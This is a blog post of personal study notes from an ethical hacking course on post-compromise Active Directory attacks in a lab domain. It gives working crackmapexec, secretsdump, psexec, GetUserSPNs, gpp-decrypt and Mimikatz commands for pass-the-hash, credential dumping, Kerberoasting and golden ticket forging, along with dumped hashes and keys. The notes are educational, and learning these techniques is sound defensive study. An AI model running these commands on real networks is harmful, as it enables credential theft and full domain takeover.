---
layout: post
title:  "TCM_security_EthicalHacking Part 15_4"
author: haran
categories: [TCM , Cyber Security]
image: post_img/2021/01/01_1/tcm.png
beforetoc: "Attacking Active Directory Post Compromise Attack"
toc: true
---

Attacking Active Directory Post Compromise Attack

## Attacking Active Directory Post Compromoise Attacks

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/1.jpg)

## Pass the hash attack

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/2.jpg)


![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/3.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/4.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/5.jpg)

```ps
crackmapexec smb 192.168.163.0/24 -u dhoni  -d MARVEL.local  -p 1234@Valimai
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/6.jpg)

- dumping the sam file

```ps
crackmapexec smb   192.168.163.0/24 -u dhoni  -d MARVEL.local  -p 1234@Valimai --sam
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/7.jpg)

```ps
SMB         192.168.163.131 445    AHL-PC           Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.163.131 445    AHL-PC           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.163.128 445    DHONI-PC         Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.163.128 445    DHONI-PC         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.163.131 445    AHL-PC           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.163.128 445    DHONI-PC         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.163.131 445    AHL-PC           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dfa0166b9627286ff32395e0a7c7c611:::
SMB         192.168.163.128 445    DHONI-PC         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dfa0166b9627286ff32395e0a7c7c611:::
SMB         192.168.163.131 445    AHL-PC           ahl:1002:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
SMB         192.168.163.131 445    AHL-PC           [+] Added 5 SAM hashes to the database
SMB         192.168.163.128 445    DHONI-PC         ahl:1002:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::

```

- login tothe system using psexec.py

``` ps
psexec.py marvel/dhoni:1234@Valimai@192.168.163.131
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/8.jpg)

### Dumping hashes with secretsdump.py

```py
secretsdump.py marvel/dhoni:1234@Valimai@192.168.163.131
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/9.jpg)

```ps
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dfa0166b9627286ff32395e0a7c7c611:::
ahl:1002:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#92d171b1a17c0bc06dc2c62aa1fc72b9
MARVEL.LOCAL/ahl:$DCC2$10240#ahl#c35c511b4828f1edac26b4379595f423
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\AHL-PC$:aes256-cts-hmac-sha1-96:a2685629a27d3031d6466d606ecbba81a5acc10b8c4cb2132b2a7f85003e9bb1
MARVEL\AHL-PC$:aes128-cts-hmac-sha1-96:51d33eeb228d3d6a3dcb4c9781589790
MARVEL\AHL-PC$:des-cbc-md5:ae1c579b511ae502
MARVEL\AHL-PC$:plain_password_hex:5c00280067002f004b00320024005e002d005300490068005e0044005e006a00510025003000480054003700610020004f002b0050005d0026003200490078004f00640021002000760077005f0052004000790079004c004c00440069002d0028006000400065003f0020004400780035004e007100510060004e005b00320050005c004d00360034003b0061007100540043003900700060003f00240053005500450025002c005e003d00540043004200470071003f00780070005c005300240070005b004c006b0037002100260072006a002b00790063002f004c0036002b007200230032006a007a0060002600
MARVEL\AHL-PC$:aad3b435b51404eeaad3b435b51404ee:55e0dd253ebfc2091d8a524ed4abcfb9:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd22f574407ccd9e5aeed8a0957a3445d62d3b609
dpapi_userkey:0x6c97e62d7274e2e3a31d3ce4ebd7bfda343c8b03
[*] NL$KM 
 0000   0D 1C 2D 54 9A AA 10 A6  55 66 EF 2B 74 F5 D6 A6   ..-T....Uf.+t...
 0010   60 9C 07 41 F0 B2 93 7B  A4 38 E2 1B 8B 8D CC 39   `..A...{.8.....9
 0020   DF 80 AF E8 66 CF 9B 3A  0F 3A 9E A2 1C 15 6C 54   ....f..:.:....lT
 0030   49 EB F7 5C 6C F6 14 E6  16 40 90 A9 7E F8 12 31   I..\l....@..~..1
NL$KM:0d1c2d549aaa10a65566ef2b74f5d6a6609c0741f0b2937ba438e21b8b8dcc39df80afe866cf9b3a0f3a9ea21c156c5449ebf75c6cf614e6164090a97ef81231
```

### Cracking NTLM Hashes with Hashcat

- Ntlm hashes pass around
- NTLM v2 hashes not pass around

-m 1000 = ntlm
-m 5600 = ntlmv2

```ps
hashcat64.exe -m 1000 hashes64.txt rockyou.txt -O
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/10.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/11.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/12.jpg)

- 31d6 adminstrator disabled blank 

### Pass the hash attacks

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/13.jpg)

```ps
crackmapexec smb 192.168.163.0/24 -u ahl -H 7ce21f17c0aee7fb9ceba532d0546ad6 --local-auth  
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/14.jpg)

-  green meen pwnable

```ps
psexec.py ahl:@192.168.163.131 -hashes aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/15.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/16.jpg)

### Pass the hash attack mitigations

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/17.jpg)

## Token Impersonation

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/18.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/19.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/20.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/21.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/22.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/23.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/24.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/25.jpg)


![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/26.jpg)

### Token impeersonation with incognito

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/27.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/28.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/29.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/30.jpg)


![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/31.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/32.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/33.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/34.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/35.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/36.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/37.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/38.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/39.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/40.jpg)

- rev2self

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/41.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/42.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/43.jpg)
- It is available until restrat the machine

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/44.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/45.jpg)

### Token impersonation mitigation strategies

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/46.jpg)

- admin login to dc only


## Kerbersosting Overview

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/47.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/48.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/49.jpg)

### Kerbersoting walk through

```py
GetUserSPNs.py  marvel.local/dhoni:'1234@Valimai' -dc-ip 192.168.163.128 -request
```

- TGS hashes

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/50.jpg)

- Application server

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/51.jpg)

```py
hashcat --help | grep kerberos
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/52.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/53.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/54.jpg)

### Kerbersosting Mitigation

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/55.jpg)

- donot make service accounts domain administrators
---
---
## Group Policy Preferences(GPP)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/56.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/57.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/58.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/59.jpg)

- Any domain user can read the policy
- cpassword = "   "
- name="new_local_admin"

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/60.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/61.jpg)

### Abusing Gpp part 1 

#### Active Box ha ck the box

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/62.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/63.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/64.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/65.jpg)

- replication support annonymous login
> sysvol file stores group.xml file in that group.xml file you can find the CPassword

- PROMPT OFF When downloading files not to open explorere

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/66.jpg)

> recurse on = download all the files asking to the server

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/67.jpg)

- ls files you can find groups.xml
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/68.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/69.jpg)

> mget * get all the files in the folder

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/70.jpg)

> - Invoke-GPP script used alternative to meterpreter to check attack
> - It will login as user and check for exploitation

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/71.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/72.jpg)

name = active.htb\SVC_TGS	
			  active.htb = domain name 
			  svc_tgs     = service ticket granting service
		
> so this is a tgs account which give tgs for requests

CPASSWORD = " VALUE" 

#### decrypt password using gpp-decrypt

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/73.jpg)

> gpp-decrypt edBSHOwhZLTjt

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/74.jpg)

> we know the password so we can reverse this 
   gpp because we know the encryption key
   
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/75.jpg)
   
   > We know the username and password of tgs service 

### Abusing GPP Part2

- login with psexec
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/76.jpg)

> Nothing is writable

TGS is a service granting service so we can do kerbersoting

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/77.jpg)

> Request for ticket 

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/78.jpg)

> we got ticket

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/79.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/80.jpg)

> The ppassword here obtain is server's ntlm hash

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/81.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/82.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/83.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/84.jpg)

---
---
## Mimikatz overview

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/85.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/86.jpg)

- Invoke.mimikatz powershell tool

> You can upload to that computer and run it

assume that we compromised a domain controller and run it 

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/87.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/88.jpg)

> Learn this https://github.com/gentilkiwi/mimikatz/wiki

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/89.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/90.jpg)

> Memory protection is there in order to we dump lsass.exe 

```ps
sekurlsa::logonpasswords
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/91.jpg)

- this is NTLM hash we can pass it through and utilize this.
- sometimes this user is amin in another computer

- administrator is the only account i logged in this domain controller.

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/92.jpg)

- we can pull out administrator hash.

- wdigest is a feature which store the passwords in clear text here.
- Feature stll exist ; patched in 2008,2010
- we can turn on with mimikatz and then take admin password 
- login ,logout register the password in place there

### try to dump the sam

```ps
lsadump::sam
lsadump::sam /patch
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/93.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/94.jpg)

> download the sam and dump it 
> meterpreter hashdump
> hashdump.py etc

```ps
lsadump::lsa /patch
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/95.jpg)

> we can dump lsa from here 

### LSA = local security authority

- Protected authority in windows subsystem
- save logon ,authentication session to the local computer

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/96.jpg)

> ntds.dit also contain all the credentials

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/97.jpg)

1. you can take in offline and crack it ; how many passwords are cracked

---
---
## Golden ticket attacks

- krbtgtr - ticket granting ticket account
- that allow us to generate tickets

>If we have hash of an account we can generate TGT 

- WE CAN ACCESS ANY SERVICE OR RESOURCE IN THE SYSTEM using the ticket granting service

- If we have a golden ticket we have entire access to the domain

```ps
lsadump::lsa /inject /name:krbtgt
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/98.jpg)

Domain : MARVEL / S-1-5-21-1123897398-1166595296-588635312

 * Primary
    NTLM : 4aa8c321b82e1eebb29e759049f903fe
	
```ps
kerberos::golden /User:Administratorfake /domain:marvel.local /sid:S-1-5-21-1123897398-1166595296-588635312  /krbtgt:4aa8c321b82e1eebb29e759049f903fe /id:500 /ptt
 ```
 
 - /id = admin userid 500
 - /ptt = pass the ticket

> - Generate the ticket
> pass it to next session 
 
 
 - Use that ticket to open up any computer

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/99.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/100.jpg)

- open up a command prompt and use that golden ticket

> We got the admin ticket here and used it for any pc

```ps
dir \\DHONI-PC\c$
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/101.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/102.jpg)

### psexec.exe download and run it to get  the shell

- silver ticket

> Golden ticket as persistance 

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/103.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/104.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_4/105.jpg)
